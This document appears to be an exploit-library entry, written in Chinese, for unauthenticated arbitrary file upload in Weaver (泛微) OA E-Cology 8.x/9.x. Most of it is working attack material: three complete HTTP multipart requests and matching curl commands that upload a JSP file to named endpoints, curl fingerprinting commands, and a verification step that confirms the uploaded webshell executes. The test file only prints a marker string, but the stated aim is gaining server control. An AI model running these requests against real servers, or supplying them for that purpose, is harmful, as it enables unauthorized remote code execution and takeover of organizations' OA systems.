---
id: WEAVER-ECOLOGY-UPLOAD-RCE
title: 泛微OA E-Cology 多接口任意文件上传
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology 9.x, 8.x"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "ecology", "uploadOperation", "weaver.common.Ctrl", "KtreeUploadAction"]
---

## 漏洞描述

泛微OA E-Cology 多个接口存在未授权文件上传漏洞，攻击者可直接上传 JSP webshell 获取服务器权限。

## 影响版本

- E-Cology 9.x
- E-Cology 8.x

## 前置条件

- 无需认证
- 目标为泛微OA E-Cology 8.x/9.x，上传接口可访问

## 利用步骤

### 路径一：uploadOperation.jsp

```http
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

### 路径二：weaver.common.Ctrl

```http
POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

### 路径三：KtreeUploadAction

```http
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

## Payload

```bash
# 路径一：uploadOperation.jsp
curl -X POST "http://target/page/exportImport/uploadOperation.jsp" \
  -F "file=@test.jsp;type=application/octet-stream"

# 路径二：weaver.common.Ctrl
curl -X POST "http://target/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp" \
  -F "file=@test.jsp;type=application/octet-stream"

# 路径三：KtreeUploadAction
curl -X POST "http://target/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image" \
  -F "file=@test.jsp;type=application/octet-stream"
```

## 验证方法

上传后访问返回路径，确认 webshell 可执行。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/page/exportImport/uploadOperation.jsp
curl -s -o /dev/null -w "%{http_code}" "http://target/weaver/weaver.common.Ctrl/.css"
```
